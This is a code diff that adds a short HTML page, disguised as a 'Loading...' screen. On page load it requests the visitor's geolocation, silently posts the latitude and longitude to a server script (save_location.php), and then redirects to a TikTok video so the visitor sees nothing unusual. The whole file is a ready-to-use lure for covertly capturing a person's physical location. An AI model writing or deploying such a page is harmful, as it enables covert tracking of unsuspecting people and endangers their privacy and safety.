@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, redirectNow);
+            } else {
+                redirectNow();
+            }
+        }
+
+        function sendLocation(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            
+            // サーバーに位置情報を送信
+            fetch("save_location.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `lat=${lat}&lon=${lon}`
+            }).finally(redirectNow); // 送信後すぐにリダイレクト
+        }
+
+        function redirectNow() {
+            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513?is_from_webapp=1&sender_device=pc&web_id=7484352181497267728"); // 飛ばしたいURL
+        }
+
+        getLocation();
+    </script>
+</head>
+<body>
+</body>
+</html>
